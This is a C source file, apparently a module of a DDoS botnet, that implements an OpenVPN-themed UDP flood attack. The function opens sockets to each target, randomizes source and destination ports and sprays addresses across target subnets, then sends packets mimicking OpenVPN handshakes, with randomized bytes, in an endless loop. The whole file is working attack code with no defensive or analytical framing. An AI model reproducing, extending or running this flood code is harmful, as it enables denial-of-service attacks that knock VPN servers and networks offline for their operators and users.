#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <errno.h>
#include <fcntl.h>

#include "../../attack.h"

void flood_udp_openvpn(struct flood *flood)
{
    struct sockaddr_in bind_addr = {0};

    int i = 0;
    int *fd = calloc(flood->num_of_targets, sizeof(int));

    // Randomize source port
    if (flood->settings->source_port == 0xffff)
        flood->settings->source_port = rand_next();

    for (i = 0; i < flood->num_of_targets; i++)
    {
        struct flood_target target = flood->targets[i];

        struct iphdr *ip_header;
        struct udphdr *udp_header;

        // Randomize destination port
        if (flood->settings->dest_port == 0xffff)
            target.sock_addr.sin_port = rand_next();

        target.sock_addr.sin_port = htons(flood->settings->dest_port);

        // Create datagram socket.
        if ((fd[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)
            return;

        // Bind a local server for the source port.
        bind_addr.sin_family = AF_INET;
        bind_addr.sin_port = flood->settings->source_port;
        bind_addr.sin_addr.s_addr = 0;
        bind(fd[i], (struct sockaddr *)&bind_addr, sizeof(struct sockaddr_in));

        // Randomize destination address if the netmask is below 32 to add subnet support.
        if (target.netmask < 32)
            target.sock_addr.sin_addr.s_addr = htonl(ntohl(target.addr) + (((uint32_t)rand_next()) >> target.netmask));

        // Connect to the UDP socket
        int x;
        for (x = 0; x < flood->settings->repeat; x++)
        {
            connect(fd[i], (struct sockaddr *)&target.sock_addr, sizeof(struct sockaddr_in));
            usleep(flood->settings->csleep * 1000);
        }
    }

    // Start sending traffic.
    while (1)
    {
        for (i = 0; i < flood->num_of_targets; i++)
        {
            struct flood_target target = flood->targets[i];

            // Randomize destination address if the netmask is below 32 to add subnet support.
            if (target.netmask < 32)
                target.sock_addr.sin_addr.s_addr = htonl(ntohl(target.addr) + (((uint32_t)rand_next()) >> target.netmask));

            unsigned char openvpn[] = {
                0x38,
                0xc4,
                0xfb,
                0x98,
                0x76,
                0x1f,
                0xfc,
                0xfe,
                0xf4,
                0x00,
                0x00,
                0x00,
                0x01,
                0x63,
                0x31,
                0x7b,
                0x62,
                0x36,
                0x3e,
                0xb1,
                0xa8,
                0x93,
                0xa8,
                0x61,
                0x98,
                0x8b,
                0x11,
                0x2a,
                0x3f,
                0x7c,
                0x1e,
                0xaa,
                0xbf,
                0xc0,
                0x63,
                0xad,
                0xb7,
                0x50,
                0x68,
                0xa0,
                0xd6,
                0x2d,
                0x0e,
                0x17,
                0x3d,
                0xf8,
                0xd4,
                0xf4,
                0x39,
                0x69,
                0x8d,
                0x69,
                0x0d,
                0x7d,
            };

            rand_bytes(openvpn + 1, 8);
            rand_bytes(openvpn + 14, 40);

            send(fd[i], openvpn, sizeof(openvpn), MSG_NOSIGNAL);
        }
    }
}
